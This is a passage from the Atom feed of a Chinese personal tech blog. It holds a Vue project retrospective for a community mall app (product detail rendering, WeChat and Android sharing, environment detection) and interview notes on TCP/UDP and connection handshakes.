<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>青山の博客</title>
  <icon>https://www.gravatar.com/avatar/d6b4ccc75d3b05793059f7fa33d47f22</icon>
  <subtitle>青山の博客</subtitle>
  <link href="https://asura1211.github.io/atom.xml" rel="self"/>
  
  <link href="https://asura1211.github.io/"/>
  <updated>2021-11-28T12:52:59.523Z</updated>
  <id>https://asura1211.github.io/</id>
  
  <author>
    <name>青山</name>
    <email>lvchangjing_hit@163.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【项目复盘】— — 贤得家社区商城</title>
    <link href="https://asura1211.github.io/2021/10/31/%E3%80%90%E9%A1%B9%E7%9B%AE%E5%A4%8D%E7%9B%98%E3%80%91%E2%80%94%20%E2%80%94%20%E8%B4%A4%E5%BE%97%E5%AE%B6%E7%A4%BE%E5%8C%BA%E5%95%86%E5%9F%8E/"/>
    <id>https://asura1211.github.io/2021/10/31/%E3%80%90%E9%A1%B9%E7%9B%AE%E5%A4%8D%E7%9B%98%E3%80%91%E2%80%94%20%E2%80%94%20%E8%B4%A4%E5%BE%97%E5%AE%B6%E7%A4%BE%E5%8C%BA%E5%95%86%E5%9F%8E/</id>
    <published>2021-10-31T15:01:17.000Z</published>
    <updated>2021-11-28T12:52:59.523Z</updated>
    
    <content type="html"><![CDATA[<h1 id="商品详情"><a href="#商品详情" class="headerlink" title="商品详情"></a>商品详情</h1><h2 id="一、商品详情页的渲染"><a href="#一、商品详情页的渲染" class="headerlink" title="一、商品详情页的渲染"></a>一、商品详情页的渲染</h2><p>后端返回的是一个装有图片的 html 文件，<a href="https://ecommunity.oss-cn-zhangjiakou.aliyuncs.com/product1623291740520.html%EF%BC%8C%E8%A6%81%E5%81%9A%E7%9A%84%E6%98%AF%E6%8A%8A">https://ecommunity.oss-cn-zhangjiakou.aliyuncs.com/product1623291740520.html，要做的是把</a> html 中的图片渲染进详情页。</p><p>想用 iframe 实现。</p><p>最后解决方案：</p><p>通过一个子组件 html-panel.vue，<strong>以 v-html 的方式渲染</strong>得到的数据，然后在父组件中加载子组件。</p><p>在子组件中，用 props 接收传入的 url ，然后 watch url 值，发生改变就调用 load 方法。在 load 方法中通过 axios 发送网络请求，将数据存入 html。</p><h2 id="二、分享"><a href="#二、分享" class="headerlink" title="二、分享"></a>二、分享</h2><p>不同环境的分享逻辑：<a href="https://developers.weixin.qq.com/doc/offiaccount/OA_Web_Apps/JS-SDK.html#1">https://developers.weixin.qq.com/doc/offiaccount/OA_Web_Apps/JS-SDK.html#1</a></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//网页端微信分享</span></span><br><span class="line"><span class="keyword">if</span> (self.env == <span class="string">&quot;web&quot;</span>) &#123;</span><br><span class="line">    self.$wx.ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        self.$wx.updateAppMessageShareData(&#123;</span><br><span class="line">            <span class="attr">title</span>: self.goodsDetails.title,</span><br><span class="line">            <span class="attr">desc</span>: <span class="string">&quot;贤得家&quot;</span>,</span><br><span class="line">            <span class="attr">link</span>: self.link, <span class="comment">// 分享链接，该链接域名或路径必须与当前页面对应的公众号JS安全域名一致</span></span><br><span class="line">            <span class="attr">imgUrl</span>: self.goodsDetails.picList[<span class="number">0</span>], <span class="comment">// 分享图标</span></span><br><span class="line">            <span class="function"><span class="title">success</span>(<span class="params"></span>)</span> &#123;&#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        self.$wx.updateTimelineShareData(&#123;</span><br><span class="line">            <span class="attr">title</span>: self.goodsDetails.title,</span><br><span class="line">            <span class="attr">desc</span>: <span class="string">&quot;贤得家&quot;</span>,</span><br><span class="line">            <span class="attr">link</span>: self.link, <span class="comment">// 分享链接，该链接域名或路径必须与当前页面对应的公众号JS安全域名一致</span></span><br><span class="line">            <span class="attr">imgUrl</span>: self.goodsDetails.picList[<span class="number">0</span>], <span class="comment">// 分享图标</span></span><br><span class="line">            <span class="function"><span class="title">success</span>(<span class="params"></span>)</span> &#123;&#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//向小程序传输分享数据</span></span><br><span class="line"><span class="keyword">if</span> (self.env == <span class="string">&quot;miniprogram&quot;</span>) &#123;</span><br><span class="line">    <span class="built_in">this</span>.$wx.miniProgram.postMessage(&#123;</span><br><span class="line">        <span class="attr">data</span>: &#123;</span><br><span class="line">            <span class="attr">title</span>: <span class="built_in">this</span>.goodsDetails.title,</span><br><span class="line">            <span class="attr">imageUrl</span>: <span class="built_in">this</span>.goodsDetails.picList[<span class="number">0</span>]</span><br><span class="line">            <span class="comment">//desc: document.querySelector(&#x27;meta[name=description]&#x27;).content</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;已把分享信息传给小程序&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//安卓分享</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.env == <span class="string">&quot;android&quot;</span>) &#123;</span><br><span class="line">    <span class="comment">// 1.地址  2.标题  3.详情  4.图片 flutter中的 pigeon</span></span><br><span class="line">    <span class="built_in">window</span>.pigeon.share(</span><br><span class="line">        <span class="built_in">this</span>.link,</span><br><span class="line">        <span class="built_in">this</span>.goodsDetails.title,</span><br><span class="line">        <span class="string">&quot;贤得家&quot;</span>,</span><br><span class="line">        <span class="built_in">this</span>.goodsDetails.picList[<span class="number">0</span>]</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然如果是在微信环境，需要先得到微信数据</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">getWxInfo</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="comment">//微信JSSDK初始化</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.$axios(&#123;</span><br><span class="line">        <span class="attr">method</span>: <span class="string">&quot;get&quot;</span>,</span><br><span class="line">        <span class="attr">url</span>: <span class="string">&quot;/Ecommunity/market/goods/goodsShare&quot;</span>,</span><br><span class="line">        <span class="attr">params</span>: &#123;</span><br><span class="line">            <span class="attr">url</span>: <span class="built_in">this</span>.url</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (res.data.success) &#123;</span><br><span class="line">            <span class="built_in">this</span>.$wx.config(&#123;</span><br><span class="line">                <span class="attr">debug</span>: <span class="built_in">this</span>.debug,</span><br><span class="line">                <span class="attr">appId</span>: res.data.data.appId,</span><br><span class="line">                <span class="attr">timestamp</span>: res.data.data.timestamp,</span><br><span class="line">                <span class="attr">nonceStr</span>: res.data.data.nonceStr,</span><br><span class="line">                <span class="attr">signature</span>: res.data.data.signature,</span><br><span class="line">                <span class="attr">jsApiList</span>: [</span><br><span class="line">                    <span class="string">&quot;updateTimelineShareData&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;updateAppMessageShareData&quot;</span></span><br><span class="line">                ]</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h2 id="三、重组参数使得页面跳转时方便传参（商品详情页面–-gt-立即购买页面）："><a href="#三、重组参数使得页面跳转时方便传参（商品详情页面–-gt-立即购买页面）：" class="headerlink" title="三、重组参数使得页面跳转时方便传参（商品详情页面–&gt;立即购买页面）："></a>三、重组参数使得页面跳转时方便传参（商品详情页面–&gt;立即购买页面）：</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = <span class="built_in">Object</span>.assign(&#123;&#125;, <span class="built_in">this</span>.goodsDetails, &#123;</span><br><span class="line">    <span class="attr">goodsId</span>: <span class="built_in">this</span>.goodsDetails.id,</span><br><span class="line">    <span class="attr">picture</span>: <span class="built_in">this</span>.goodsDetails.picList[<span class="number">0</span>],</span><br><span class="line">    <span class="attr">goodsSizeName</span>: <span class="built_in">this</span>.goodsSizeName</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">let</span> res = &#123;</span><br><span class="line">    <span class="attr">data</span>: &#123;</span><br><span class="line">        <span class="attr">data</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">payType</span>: <span class="built_in">this</span>.payType,</span><br><span class="line">                <span class="attr">storeId</span>: <span class="built_in">this</span>.goodsDetails.storeDetailResult.id,</span><br><span class="line">                <span class="attr">storeName</span>: <span class="built_in">this</span>.goodsDetails.storeDetailResult.name,</span><br><span class="line">                <span class="attr">quantity</span>: <span class="built_in">this</span>.goodsDetails.quantity,</span><br><span class="line">                <span class="attr">goodsSizeId</span>: <span class="built_in">this</span>.goodsDetails.goodsSizeId,</span><br><span class="line">                <span class="attr">shoppingCartResults</span>: [obj]</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">this</span>.$router.replace(&#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&quot;/orderPage&quot;</span>,</span><br><span class="line">    <span class="attr">query</span>: &#123;</span><br><span class="line">        <span class="attr">id</span>: <span class="built_in">this</span>.goodsId,</span><br><span class="line">        <span class="attr">details</span>: res,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h1 id="首页"><a href="#首页" class="headerlink" title="首页"></a>首页</h1><p>1、通过 v-for 对首页布局<code>&lt;div v-for=&quot;(item, index) in layout&quot; :key=&quot;index&quot;&gt;</code>，通过<code>item.type</code> 判断类型（轮播图、分类栏、商品模块、广告、店铺模块、猜你喜欢）</p><p>2、首次加载页面时通过 v-if 加载 van-loading 组件，优化用户首屏体验。</p><p>3、动态赋值 css；ref 给 dom 元素或子组件信息绑定注册信息，引用信息会注册到父组件的 $refs 属性上。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span></span></span><br><span class="line"><span class="tag">  <span class="attr">:class</span>=<span class="string">&quot;[item.carouselAdLayout == 0 ? &#x27;home-swipe1&#x27; : &#x27;home-swipe2&#x27;,&#x27;swipe-height&#x27;,]&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">ref</span>=<span class="string">&quot;dynheight&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span></span><br></pre></td></tr></table></figure><p>4、使用 vantui 中的 v-lazy 指令对轮播图片进行懒加载。轮播图以 list 中最大的图片高度为基准，以 setProperty 方法自定义属性：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">dynamicSwiperHeight</span>(<span class="params">init</span>)</span> &#123;</span><br><span class="line">  <span class="comment">// init 为list 中最大的图片高度</span></span><br><span class="line">  <span class="keyword">let</span> height = <span class="string">`<span class="subst">$&#123;<span class="built_in">Number</span>(init) <span class="regexp">/ 2 /</span> <span class="number">36</span>&#125;</span>rem`</span>;</span><br><span class="line">  <span class="built_in">this</span>.$nextTick(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.$refs.dynheight) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="built_in">this</span>.$refs.dynheight.length; ++i) &#123;</span><br><span class="line">        <span class="built_in">this</span>.$refs.dynheight[i].style.setProperty(<span class="string">&quot;--dycHeight&quot;</span>, height);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);<span class="number">1</span></span><br></pre></td></tr></table></figure><p>然后在 css 中以 <code>height: var(--dycHeight); </code> 赋值。</p><p>5、分类栏、商品展示部分采用 flex 布局。宽度通过 <code>:style=&quot;&#123; width: 100 / item.categoryLayoutColumn + &#39;%&#39; &#125;&quot;</code> 设置。</p><p>6、对价格进行过滤显示（两位小数加 ￥）：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">filters: &#123;</span><br><span class="line">  <span class="function"><span class="title">toFiex2</span>(<span class="params">number</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> number ? <span class="string">`¥ <span class="subst">$&#123;<span class="built_in">Number</span>(number).toFixed(<span class="number">2</span>)&#125;</span>`</span> : <span class="string">&quot;&quot;</span>;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>7、取消滚动条：</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.clear-scrollbar</span> &#123;</span><br><span class="line">    <span class="attribute">overflow-y</span>: auto;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.clear-scrollbar</span>::-webkit-scrollbar&#123;</span><br><span class="line">    width:<span class="number">0px</span> <span class="meta">!important</span>;</span><br><span class="line">    <span class="attribute">height</span>:<span class="number">0px</span> <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>8、封装 getParam.js函数：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> <span class="title">getParam</span>(<span class="params">str,url</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// var url = window.location.href;</span></span><br><span class="line">    <span class="keyword">var</span> paramStr = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (url.indexOf(<span class="string">&quot;?&quot;</span>) != -<span class="number">1</span>)</span><br><span class="line">        paramStr = url.split(<span class="string">&quot;?&quot;</span>)[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">var</span> paramList = [];</span><br><span class="line">    <span class="keyword">var</span> params = [];</span><br><span class="line">    <span class="keyword">if</span> (paramStr.indexOf(<span class="string">&quot;&amp;&quot;</span>) != -<span class="number">1</span>)</span><br><span class="line">        params = paramStr.split(<span class="string">&quot;&amp;&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> params.push(paramStr);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; params.length; i++) &#123;</span><br><span class="line">        paramList[params[i].split(<span class="string">&quot;=&quot;</span>)[<span class="number">0</span>]] = params[i].split(<span class="string">&quot;=&quot;</span>)[<span class="number">1</span>]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> param = paramList[str];</span><br><span class="line">    <span class="keyword">return</span> param;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="对接"><a href="#对接" class="headerlink" title="对接"></a>对接</h2><p>1、后端返回的首页信息是 json 格式，所以通过如下代码解析并过滤。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">self.layout = data.data.map(<span class="function">(<span class="params">i</span>) =&gt;</span> <span class="built_in">JSON</span>.parse(i)).filter(<span class="function">(<span class="params">i</span>) =&gt;</span> i.type != <span class="string">&quot;5&quot;</span>);</span><br></pre></td></tr></table></figure><p>2、模拟小程序底部 tab 栏：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 跳转小程序页面</span></span><br><span class="line"><span class="function"><span class="title">skipWxUrl</span>(<span class="params">num</span>)</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> url;</span><br><span class="line">  <span class="keyword">switch</span> (num) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      url = <span class="string">&quot;/pages/sojournPension/sojournPension&quot;</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      url = <span class="string">&quot;/pages/hotActivity/hotActivity&quot;</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      url = <span class="string">&quot;/pages/mine/mine&quot;</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">this</span>.$wx.miniProgram.switchTab(&#123; <span class="attr">url</span>: url &#125;);</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>3、前端测试登录：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">testLogin</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">  <span class="built_in">this</span>.$axios(&#123;</span><br><span class="line">    <span class="attr">url</span>: <span class="string">&quot;/Ecommunity/app/verifyCodeLogin&quot;</span>,</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&quot;GET&quot;</span>,</span><br><span class="line">    <span class="attr">params</span>: &#123;</span><br><span class="line">      <span class="attr">phoneNum</span>: <span class="string">&quot;16678891662&quot;</span>,</span><br><span class="line">      <span class="attr">verifyCode</span>: <span class="string">&quot;528878&quot;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;).then(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.$store.commit(<span class="string">&quot;setUserId&quot;</span>, res.data.data.id);</span><br><span class="line">    <span class="built_in">this</span>.$toast(res.data.data.id);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><p>4、获取当前环境：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">getValue</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">  <span class="comment">// 判断在微信小程序环境中</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">window</span>.__wxjs_environment === <span class="string">&quot;miniprogram&quot;</span>) &#123;</span><br><span class="line">    <span class="built_in">this</span>.WChatURL = <span class="built_in">window</span>.location.href; <span class="comment">//获取小程序端访问的 url</span></span><br><span class="line">    <span class="comment">// 获取 url 中携带的参数</span></span><br><span class="line">    <span class="keyword">let</span> userId = getParam(<span class="string">&quot;userId&quot;</span>, <span class="built_in">this</span>.WChatURL);</span><br><span class="line">    <span class="keyword">let</span> token = getParam(<span class="string">&quot;token&quot;</span>, <span class="built_in">this</span>.WChatURL);</span><br><span class="line">    <span class="keyword">let</span> orderState = getParam(<span class="string">&quot;orderState&quot;</span>, <span class="built_in">this</span>.WChatURL);</span><br><span class="line">    <span class="built_in">this</span>.$store.commit(<span class="string">&quot;setUserId&quot;</span>, userId);</span><br><span class="line">    <span class="built_in">this</span>.$store.commit(<span class="string">&quot;setEnv&quot;</span>, <span class="string">&quot;miniprogram&quot;</span>);</span><br><span class="line">    testLogin(token, userId);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (</span><br><span class="line">    navigator.userAgent.indexOf(<span class="string">&quot;Android&quot;</span>) &gt; -<span class="number">1</span> ||</span><br><span class="line">    navigator.userAgent.indexOf(<span class="string">&quot;Adr&quot;</span>) &gt; -<span class="number">1</span></span><br><span class="line">  ) &#123;</span><br><span class="line">    <span class="comment">// 判断在安卓APP环境中</span></span><br><span class="line">    <span class="built_in">this</span>.WChatURL = <span class="built_in">window</span>.location.href;</span><br><span class="line">    <span class="keyword">let</span> userId = getParam(<span class="string">&quot;userId&quot;</span>, <span class="built_in">this</span>.WChatURL);</span><br><span class="line">    <span class="keyword">let</span> token = getParam(<span class="string">&quot;token&quot;</span>, <span class="built_in">this</span>.WChatURL);</span><br><span class="line">    <span class="keyword">let</span> orderState = getParam(<span class="string">&quot;orderState&quot;</span>, <span class="built_in">this</span>.WChatURL);</span><br><span class="line">    <span class="built_in">this</span>.$store.commit(<span class="string">&quot;setUserId&quot;</span>, userId);</span><br><span class="line">    <span class="built_in">this</span>.$store.commit(<span class="string">&quot;setEnv&quot;</span>, <span class="string">&quot;android&quot;</span>);</span><br><span class="line">    testLogin(token, userId);   </span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.$store.commit(<span class="string">&quot;setEnv&quot;</span>, <span class="string">&quot;web&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在其他组件通过 <code>this.$store.state.env</code> 就可以得到当前的 env。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;商品详情&quot;&gt;&lt;a href=&quot;#商品详情&quot; class=&quot;headerlink&quot; title=&quot;商品详情&quot;&gt;&lt;/a&gt;商品详情&lt;/h1&gt;&lt;h2 id=&quot;一、商品详情页的渲染&quot;&gt;&lt;a href=&quot;#一、商品详情页的渲染&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="项目复盘" scheme="https://asura1211.github.io/categories/%E9%A1%B9%E7%9B%AE%E5%A4%8D%E7%9B%98/"/>
    
    
  </entry>
  
  <entry>
    <title>【面试准备】— — 计算机网络</title>
    <link href="https://asura1211.github.io/2021/10/13/%E3%80%90%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E3%80%91%E2%80%94%20%E2%80%94%20%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    <id>https://asura1211.github.io/2021/10/13/%E3%80%90%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E3%80%91%E2%80%94%20%E2%80%94%20%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/</id>
    <published>2021-10-13T14:28:02.000Z</published>
    <updated>2021-12-09T02:01:51.667Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文是作者在学习计网，准备实习面试时整理的笔记，参考自掘金上已经整理好的博客：<a href="https://juejin.cn/post/6844903592965439501">面试带你飞：这是一份全面的 计算机网络基础 总结攻略</a>、<a href="https://juejin.cn/post/6844904079974465544">前端需要了解的计算机网络知识， 这一篇就够了！(图文并茂，万字长文，点赞收藏哦！)</a>、<a href="https://juejin.cn/post/6850037263116533773">14期-连肝7个晚上，总结了计算机网络的知识点！（共66条）</a>、（<a href="https://juejin.cn/post/6844904100035821575">建议精读）HTTP灵魂之问，巩固你的 HTTP 知识体系</a>、<a href="https://juejin.cn/post/6844904070889603085">(建议收藏)TCP协议灵魂之问，巩固你的网路底层基础</a>等并进行了整理。侵权删。</p><h1 id="传输层—-TCP-与-UDP"><a href="#传输层—-TCP-与-UDP" class="headerlink" title="传输层— TCP 与 UDP"></a>传输层— TCP 与 UDP</h1><h2 id="说一说-TCP-与-UDP-的特点、区别？（TCP高频）"><a href="#说一说-TCP-与-UDP-的特点、区别？（TCP高频）" class="headerlink" title="说一说 TCP 与 UDP 的特点、区别？（TCP高频）"></a>说一说 TCP 与 UDP 的特点、区别？（TCP高频）</h2><p>简单概括区别： TCP  是一个<strong>面向连接的、可靠的、基于字节流</strong>的传输层协议。而 UDP 是一个<strong>面向无连接的</strong>传输层协议。</p><p> TCP  三大核心特性:</p><p>1、<strong>面向连接</strong>。连接指的是客户端和服务器的连接，在双方互相通信之前， TCP  需要三次握手建立连接，而 UDP 没有相应建立连接的过程。</p><p>2、<strong>可靠性</strong>。可靠性体现在<strong>有状态</strong>和<strong>可控制</strong>。（如何保证有效传输？涉及[流量控制](###说一说 TCP 的流量控制)、[拥塞控制](###说说 TCP 的拥塞控制（高频）)）</p><ul><li> TCP  会精准记录哪些数据发送，哪些数据被对方接收，哪些没有被接收到，而且保证数据包按序到达，不允许半点差错。这是有状态。</li><li>当意识到丢包了或者网络环境不佳， TCP  会根据具体情况调整自己的行为，控制自己的发送速度或者重发。这是可控制。</li><li>相应的， UDP  就是无状态、不可控的。</li></ul><p>3、<strong>面向字节流</strong>。 UDP  的数据传输是基于数据报的，这是因为仅仅只是继承了 IP 层的特性，而 TCP 为了维护状态，将一个个 IP 包变成了字节流。</p><p>4、由于 TCP 是连接的通信，需要有三次握手、重新确认等连接过程，会有延时，<strong>实时性差</strong>；由于协议所致，<strong>安全性较高</strong>；而 UDP 无连接，无建立连接的过程，因而实时性较强，安全略差；</p><p>5、在传输相同大小的数据时， TCP 首部开销20字节；UDP 首部开销只有8个字节， TCP 报头比 UDP 复杂，故<strong>实际包含的用户数据较少</strong>。 TCP 无丢包，而 UDP 有丢包，故 TCP <strong>开销</strong>大， UDP 开销较小；</p><p>6、每条 TCP 连接只能是点到点的； UDP 支持一对一、一对多、多对一、多对多的交互通信。</p><h3 id="应用场景的区别"><a href="#应用场景的区别" class="headerlink" title="应用场景的区别"></a>应用场景的区别</h3><p>1、对实时性要求高和高速传输的场景下需要使用 UDP ；</p><p>2、需要传输大量数据且对数据可靠性要求高的场景使用 TCP ；</p><p>3、可靠性要求低、追求效率时况使用 UDP ；</p><h3 id="如何用-UDP-实现可靠连接？"><a href="#如何用-UDP-实现可靠连接？" class="headerlink" title="如何用 UDP 实现可靠连接？"></a>如何用 UDP 实现可靠连接？</h3><p>参考自<a href="https://www.cnblogs.com/williamjie/p/11133180.html">UDP如何实现可靠传输</a></p><p>在应用层模仿传输层 TCP 的可靠性传输。下面不考虑拥塞处理，可靠UDP的简单设计。</p><ol><li>添加 seq/ack 机制，确保数据发送到对端</li><li>添加发送和接收缓冲区，主要是用户超时重传。</li><li>添加超时重传机制。</li></ol><p>详细说明：送端发送数据时，生成一个随机seq=x，然后每一片按照数据大小分配seq。数据到达接收端后接收端放入缓存，并发送一个ack=x的包，表示对方已经收到了数据。发送端收到了ack包后，删除缓冲区对应的数据。时间到后，定时任务检查是否需要重传数据。</p><h2 id="三次握手建立连接（高频）"><a href="#三次握手建立连接（高频）" class="headerlink" title="三次握手建立连接（高频）"></a>三次握手建立连接（高频）</h2><p>概括：三次握手才能保证双方具有接收和发送的能力</p><p>具体：</p><ul><li>三次握手才可以阻止重复历史连接的初始化（主要原因）</li><li>三次握手才可以同步双方的初始序列号</li><li>三次握手才可以避免资源浪费</li></ul><h3 id="TCP-三次握手过程及状态变化？"><a href="#TCP-三次握手过程及状态变化？" class="headerlink" title="TCP 三次握手过程及状态变化？"></a>TCP 三次握手过程及状态变化？</h3><p><img src="https://i.loli.net/2021/10/14/QEeMw8B3617XJId.png" alt="image.png"></p><p>三次握手要确认双方的两样能力：发送能力与接收的能力。</p><ul><li>最开始双方都属于CLOSED状态。然后服务器开始监听某个端口，进入LISTEN状态。</li><li>客户端主动发起连接，发送SYN，自己变成了SYN-SENT状态</li><li>服务端收到，返回SYN和ACK（对应客户端发来的SYN），自己变成了SYN-RECD</li><li>客户端再发送ACK给服务端，自己变成ESTABLISHED状态；服务端收到ACK之后，也变成这个状态</li></ul><p>（凡是需要对端确认的，一定消耗 TCP 报文的序列号。SYN 需要对端的确认， 而 ACK 并不需要，因此 SYN 消耗一个序列号而 ACK 不需要。）</p><h3 id="为什么不是两次握手？"><a href="#为什么不是两次握手？" class="headerlink" title="为什么不是两次握手？"></a>为什么不是两次握手？</h3><p><strong>根本原因：无法确认客户端的接收能力。</strong></p><p>如果只有「两次握手」，当客户端的 SYN 请求连接在网络中阻塞，没有接收到 ACK 报文，客户端就会重新发送 SYN 。由于没有第三次握手，服务器不清楚客户端是否收到了自己发送的建立连接的ACK 确认信号，所以每收到一个 SYN 就只能先主动建立一个连接。</p><p>因此，如果客户端的 SYN 阻塞了，重复发送多次 SYN 报文，那么服务器在收到请求后就会建立多个冗余的无效链接，<strong>造成不必要的资源浪费。</strong></p><h3 id="为什么不是四次握手？"><a href="#为什么不是四次握手？" class="headerlink" title="为什么不是四次握手？"></a>为什么不是四次握手？</h3><p>三次握手的目的是确认双方发送和接收的能力，100 次都可以。但为了解决问题，三次就<strong>足够</strong>了。</p><h3 id="握手过程中可以携带数据吗？"><a href="#握手过程中可以携带数据吗？" class="headerlink" title="握手过程中可以携带数据吗？"></a>握手过程中可以携带数据吗？</h3><p>可以，但是只有第三次，此时的 ESTABLISHED 状态相对安全并且够确认服务器的接收发送能力。</p><p>如果前两次握手能够携带数据，那么一旦有人想攻击服务器，那么他只需要在第一次握手中的 SYN 报文中放大量数据，那么服务器势必会消耗更多的时间和内存空间去处理这些数据，增大了服务器被攻击的风险。</p><h3 id="同时握手的情况会发生什么？"><a href="#同时握手的情况会发生什么？" class="headerlink" title="同时握手的情况会发生什么？"></a>同时握手的情况会发生什么？</h3><p><img src="https://i.loli.net/2021/10/14/wdqWrUyg7tp8vXL.png" alt="image.png"></p><ul><li>发完SYN，两者的状态都变为SYN-SENT。</li><li>在各自收到对方的SYN后，两者状态都变为SYN-REVD。</li><li>接着会回复对应的ACK + SYN，这个报文在对方接收之后，两者状态一起变为ESTABLISHED。</li></ul><h2 id="四次挥手断开连接（高频）"><a href="#四次挥手断开连接（高频）" class="headerlink" title="四次挥手断开连接（高频）"></a>四次挥手断开连接（高频）</h2><h3 id="四次挥手的过程及状态变化？"><a href="#四次挥手的过程及状态变化？" class="headerlink" title="四次挥手的过程及状态变化？"></a>四次挥手的过程及状态变化？</h3><p><img src="https://i.loli.net/2021/10/14/fCO7AKDJd31jMSU.png" alt="image.png"></p><ol><li>开始双方处于ESTABLISHED状态。</li><li>客户端要断开了，向服务器发送 FIN 报文</li><li>发送后客户端变成了FIN-WAIT-1状态。注意， 这时候客户端同时也变成了 half-close (半关闭)状态，即无法向服务端发送报文，只能接收。</li><li>服务端接收后向客户端确认，变成了CLOSED-WAIT状态。</li><li>客户端接收到了服务端的确认，变成了FIN-WAIT-2状态。</li><li>随后，服务端向客户端发送FIN，自己进入LAST-ACK状态，</li><li>客户端收到服务端发来的FIN后，自己变成了TIME-WAIT状态，然后发送 ACK 给服务端。</li></ol><p><strong>如何证明信息发送完毕？</strong></p><p>客户端需要等待2 个 MSL 